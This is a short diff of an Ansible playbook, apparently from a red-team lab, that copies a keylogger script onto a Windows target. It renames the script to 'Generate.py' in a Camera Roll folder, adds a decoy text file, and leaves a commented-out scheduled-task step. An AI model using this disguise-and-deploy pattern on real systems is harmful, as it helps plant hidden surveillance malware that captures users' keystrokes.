@@ -2,7 +2,12 @@
     - name: Copy Keylogger script to the target machine
       win_copy:
         src: "/home/kali/RedTeam/keylogger.py"
-        dest: "C:\\Users\\{{ ansible_user }}\\Videos\\keylogger.py"
+        dest: "C:\\Users\\{{ ansible_user }}\\Pictures\\Camera Roll\\Generate.py"
+
+    - name: Fake text file
+      win_copy:
+        src: "/home/kali/hello.txt"
+        dest: "C:\\Users\\{{ ansible_user }}\\Videos\\Captures\\hello.txt"
 
 #    - name: Create a scheduled task to run the keylogger
 #      win_shell: |
